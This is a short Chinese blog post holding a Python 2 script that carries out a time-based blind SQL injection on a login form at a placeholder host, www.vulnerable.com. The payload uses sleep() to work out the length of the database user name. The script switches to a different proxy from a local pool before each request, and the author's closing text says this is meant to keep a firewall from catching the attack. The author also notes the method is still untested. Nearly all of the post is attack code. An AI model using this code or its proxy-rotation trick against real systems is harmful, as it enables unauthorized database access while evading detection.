Title: Sql代理注入
Category: SQL
Date: 2016-11-8
slug: sql-proxy-injection

```
#!/usr/bin/env python
# coding: utf-8

import requests
import time

target = 'http://www.vulnerable.com'
headers = {
	"Host": "www.vulnerable.com",
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0" ,
	'Connection': 'close',
	"Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"
}


for i in range(1, 28):
	cookies = {"PHPSESSID": "f4udpabdluoed7ldhfp90"}
	payload = "1' or select if(length(user())={},sleep(15),1) or '1'='1".format(i)
	data = {"username": payload, "userpwd": "abc"}

	def val():
		while 1:
			r = requests.get("http://127.0.0.1:1111/time<4")
			proxy = r.content.strip("[\"]")
			ab = time.time()
			try:
				test = requests.get("http://www.vulnerable.com", headers=headers, proxies={"http": proxy}, timeout=5)
				if test.content:
					return (time.time() - ab), proxy
			except Exception:
				pass

	while 1:
		testtime, proxy = val()
		now = time.time()
		try:
			req = requests.post(target, headers=headers, proxies={"http": proxy}, cookies=cookies, data=data, timeout=200)
			if req.content:
				print "[*]i:%s, before:%s, now:%s, Cost:%s" % (i, now, time.time(), time.time()-now)
				print "[*]proxy:%s, Content:%s, Testtime:%s" % (proxy, len(req.content), testtime)
				print "[*]TimeCompare: %s" % ((time.time()-now) - testtime)
				print "=" * 30
				break
		except Exception:
			pass
```
开个proxypool.py，然后`http://127.0.0.1:1111/time<4`找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。

实测还没测出来，感觉有点悬。